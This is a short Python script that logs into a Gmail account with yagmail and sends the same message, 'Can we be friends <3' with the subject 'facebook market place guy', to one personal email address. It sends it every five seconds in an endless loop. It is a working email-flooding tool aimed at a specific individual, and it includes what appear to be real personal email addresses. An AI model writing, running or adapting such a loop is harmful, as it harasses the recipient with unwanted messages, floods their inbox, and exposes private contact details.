import yagmail
import os
import time

sender = 'powerof7.30@gmail.com'
receiver = 'parmardimple14@gmail.com'

subject = "facebook market place guy"

contents = """Can we be friends <3 """

gmail = yagmail.SMTP(user=sender, password=os.getenv('PASSWORD') )

while True:
  gmail.send(to=receiver, subject=subject, contents=contents)
  print ("EmailSent!!")
  time.sleep(5)

